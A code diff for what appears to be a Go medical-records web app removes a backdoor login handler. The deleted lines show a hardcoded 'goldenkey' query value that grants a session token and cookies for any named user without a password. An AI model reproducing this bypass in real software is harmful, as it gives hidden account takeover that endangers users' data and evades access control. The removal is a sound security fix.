@@ -8,7 +8,6 @@ package controller
 
 import (
 	"encoding/json"
-	"fmt"
 	"gitee.com/uni-minds/medical-sys/database"
 	"gitee.com/uni-minds/medical-sys/global"
 	"gitee.com/uni-minds/medical-sys/manager"
@@ -166,25 +165,6 @@ func ApiUserPost(ctx *gin.Context) {
 		} else {
 			module.UserSetActive(module.UserGetUid(r.Username))
 			ctx.JSON(http.StatusOK, SuccessReturn("/"))
-		}
-	}
-}
-
-func ApiUserGet(ctx *gin.Context) {
-	switch ctx.Param("op") {
-	case "login":
-		gkey := ctx.Query("goldenkey")
-		if gkey == "Uni-Ledger-RIS" {
-			username := ctx.Query("user")
-			uid := module.UserGetUid(username)
-			if uid != 0 {
-				token := manager.TokenNew(uid)
-				log("w", fmt.Sprint("------ GOLDEN KEY OVERRIDE / username: %s / uid: %d / token: %s / ------", username, uid, token))
-				CookieWrite(ctx, "token", token, global.GetCookieMaxAge())
-				CookieWrite(ctx, "uid", strconv.Itoa(uid), global.GetCookieMaxAge())
-				ctx.Redirect(http.StatusFound, "/")
-				return
-			}
 		}
 	}
 }
